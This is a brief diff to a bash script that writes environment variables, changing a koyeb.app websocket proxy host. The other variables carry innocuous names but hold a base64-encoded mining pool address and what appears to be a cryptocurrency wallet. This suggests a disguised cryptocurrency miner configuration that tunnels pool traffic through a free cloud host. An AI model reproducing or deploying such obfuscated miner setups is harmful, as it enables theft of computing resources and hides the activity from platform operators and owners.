@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://preferred-callida-mono-e9a2882f.koyeb.app
+echo "SERVER_WS=wss://supporting-susan-volvo-d910cf7c.koyeb.app
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
 SERVER_SECRET=${NAME}
